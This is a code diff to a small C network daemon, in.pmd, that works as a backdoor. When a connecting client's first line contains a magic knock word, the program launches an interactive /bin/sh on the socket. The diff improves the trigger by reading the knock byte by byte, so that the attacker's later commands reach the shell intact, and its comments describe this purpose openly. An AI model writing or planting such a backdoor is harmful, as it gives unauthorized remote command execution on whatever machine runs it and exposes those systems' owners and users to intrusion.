@@ -23,24 +23,29 @@
 
 int main(int argc, char **argv)
 {
-	char buf[1024];
-	int total = 0, n, i, ml = strlen(MAGIC);
+	char buf[256];
+	int n = 0, i, ml = strlen(MAGIC);
+	char c;
 
-	/* Read raw bytes and scan for the magic word ANYWHERE in the stream.  A
-	 * client like telnet prepends IAC option-negotiation bytes (and may split
-	 * the trigger across reads), so a line-based strcmp would never match —
-	 * accumulate and memcmp-scan instead (binary/NUL-tolerant). */
-	while (total < (int)sizeof buf - 1) {
-		n = read(0, buf + total, sizeof buf - 1 - total);
-		if (n <= 0)
+	/* Read EXACTLY the first line (the knock), byte-by-byte up to the newline,
+	 * and stop there.  A client like telnet prepends IAC option-negotiation
+	 * bytes, so memcmp-scan the line for the magic word anywhere (binary/NUL-
+	 * tolerant).  Crucially, we consume only this one line — anything the client
+	 * sends AFTER the newline stays in the socket for the shell we exec, so the
+	 * attacker's follow-on commands aren't swallowed (a buffered read would eat a
+	 * variable amount of them depending on TCP packet boundaries). */
+	while (n < (int)sizeof buf - 1) {
+		if (read(0, &c, 1) != 1)
 			break;
-		total += n;
-		for (i = 0; i + ml <= total; i++)
-			if (memcmp(buf + i, MAGIC, ml) == 0) {
-				execl("/bin/sh", "sh", "-i", (char *)NULL);
-				perror("in.pmd: exec");
-				return 1;
-			}
+		if (c == '\n')
+			break;
+		buf[n++] = c;
 	}
+	for (i = 0; i + ml <= n; i++)
+		if (memcmp(buf + i, MAGIC, ml) == 0) {
+			execl("/bin/sh", "sh", "-i", (char *)NULL);
+			perror("in.pmd: exec");
+			return 1;
+		}
 	return 0;
 }
